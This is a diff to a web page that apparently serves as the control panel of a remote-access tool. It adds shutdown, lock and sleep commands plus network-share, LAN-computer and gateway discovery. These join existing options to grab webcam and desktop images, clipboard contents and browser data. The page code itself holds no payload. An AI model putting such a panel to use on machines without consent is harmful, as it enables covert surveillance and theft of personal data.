@@ -27,11 +27,20 @@
             <label for="command">Command</label>
             <select id="command" class="form-control">
                 @*<option value="@Library.ECommand.DO_NOTHING">Do nothing</option>*@
+                <option value="@Library.ECommand.SYSCMD_SHUTDOWN">Shutdown</option>
+                <option value="@Library.ECommand.SYSCMD_RESTART">Restart</option>
+                <option value="@Library.ECommand.SYSCMD_LOGOFF">Logoff</option>
+                <option value="@Library.ECommand.SYSCMD_LOCKCOMPUTER">Lock</option>
+                <option value="@Library.ECommand.SYSCMD_HIBERNATE">Hibernate</option>
+                <option value="@Library.ECommand.SYSCMD_SLEEP">Sleep</option>
                 <option value="@Library.ECommand.UPLOAD_IMAGE">Get desktop image</option>
                 <option value="@Library.ECommand.UPLOAD_WEBCAM_IMAGE">Get webcam image</option>
                 <option value="@Library.ECommand.UPLOAD_PROCESS_INFO">Get processes</option>
                 <option value="@Library.ECommand.KILL_PROCESS">Kill Process</option>
-                <option value="@Library.ECommand.UPLOAD_PORT_INFO">Get port info</option>
+                <option value="@Library.ECommand.UPLOAD_PORT_INFO">Get ports</option>
+                <option value="@Library.ECommand.UPLOAD_SHARES">Get shares</option>
+                <option value="@Library.ECommand.UPLOAD_LAN_COMPUTERS">Get LAN computers</option>
+                <option value="@Library.ECommand.UPLOAD_GATEWAYS">Get gateways</option>
                 <option value="@Library.ECommand.UPLOAD_CLIPBOARD_DATA">Get Clipboard data</option>
                 <option value="@Library.ECommand.UPLOAD_BROWSER_DATA">Get browser data</option>
                 @*<option value="@Library.ECommand.DOWNLOAD_FILE">Upload a file</option>*@
@@ -201,6 +210,15 @@
                     //updatePortInfo();
                     fileToOpen = "ports.txt";
                     break;
+                case '@Library.ECommand.UPLOAD_SHARES':
+                    fileToOpen = "shares.txt";
+                    break;
+                case '@Library.ECommand.UPLOAD_LAN_COMPUTERS':
+                    fileToOpen = "lan_computers.txt";
+                    break;
+                case '@Library.ECommand.UPLOAD_GATEWAYS':
+                    fileToOpen = "gateways.txt";
+                    break;
                 case '@Library.ECommand.STREAM_DESKTOP':
                     StartStreamDesktop();
                     break;
@@ -326,6 +344,8 @@
                     $("#param_body").html('<textarea rows="5" style="width:100%;" class="form-control" name="Parameters" id="Parameters"></textarea>');
                     break;
                 default:
+                    $("#parameters_div").hide();
+                    $("#filename_div").hide();
                     break;
             }
         });
